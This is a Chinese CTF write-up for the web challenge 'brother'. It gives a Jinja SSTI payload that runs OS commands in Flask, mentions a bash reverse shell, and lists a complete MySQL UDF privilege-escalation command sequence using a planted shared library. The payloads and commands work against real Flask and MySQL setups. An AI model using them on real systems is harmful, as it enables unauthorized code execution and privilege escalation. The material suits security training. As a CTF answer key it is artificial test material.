# brother

> 分类：Web

## 题目描述

开局一个无 WAF 的 SSTI，反弹 shell 后进入容器，最终通过 MySQL UDF 提权。

## 考察知识点

- Flask SSTI（fenjing）
- 反弹 shell
- MySQL UDF 提权

## 解法

1. 开局无 WAF 的 SSTI，fenjing 一把梭，bash 反弹 shell（题目删了 curl，可用 wget）：

```python
{'name': "{{cycler.next.__globals__.__builtins__.__import__('os').popen(<RCE>).read()}}"}
```

2. 进去后有三个文件，其中 api.py 给出 mysql 账密（`ctf/123456`，端口 6666）。

3. MySQL UDF 提权（直接 mysql 打完了，无需提权到 two 读 evil.key）：

```shell
mysql -uctf -p123456 -P 6666 -e "SHOW DATABASES;"
mysql -uctf -p123456 -P 6666 -D mysql -e "SELECT Host,User,Password FROM user;"
mysql -uctf -p123456 -P 6666 -D mysql -e "show variables like '%secure_file_priv%';"
mysql -uctf -p123456 -P 6666 -D mysql -e "show variables like '%plugin%';"
# UDF 提权
mysql -uctf -p123456 -P 6666 -D mysql -e "create table foo(line blob);"
mysql -uctf -p123456 -P 6666 -D mysql -e "insert into foo values(load_file('/tmp/lib_mysqludf_sys_64.so'));"
mysql -uctf -p123456 -P 6666 -D mysql -e "select * from foo into dumpfile '/usr/lib/mysql/plugin/udf.so';"
mysql -uctf -p123456 -P 6666 -D mysql -e "CREATE FUNCTION sys_eval RETURNS STRING SONAME 'udf.so';"
mysql -uctf -p123456 -P 6666 -D mysql -e "select sys_eval('whoami');"
```

## 参考答案

（flag 通过 UDF 提权后读取）

## 来源

- 作者：Eddie_Murphy | https://www.cnblogs.com/EddieMurphy-blogs/p/18286293
